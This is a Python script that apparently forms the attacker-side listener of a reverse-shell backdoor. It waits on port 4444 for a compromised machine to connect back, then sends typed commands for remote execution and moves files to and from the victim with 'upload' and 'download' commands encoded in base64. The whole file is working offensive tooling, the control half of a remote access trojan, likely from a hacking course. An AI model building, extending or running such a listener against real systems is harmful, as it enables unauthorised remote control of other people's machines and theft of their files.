import socket
import json
import base64

class Listener:

    def __init__(self, ip, port):

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # ----------------------------------------------------------------------------
        listener.bind((ip, port))
        listener.listen(0)


        print("[+] Waiting for incoming connection ...")


        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data) #serialisation

        self.connection.send(json_data.encode())

    def reliable_recive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] file downloaded successfully!"

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def execute_remotly(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_recive()





    def run(self):



        while True:
            command = input("\n>> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode('ascii'))


                result = self.execute_remotly(command)





                if command[0] == "download" and len(command) > 1:

                    result = self.write_file(command[1], result)
            except Exception:
                result = b"[-] Error when command execution !"

            print(result)


listener = Listener('127.0.0.1', 4444)
listener.run()
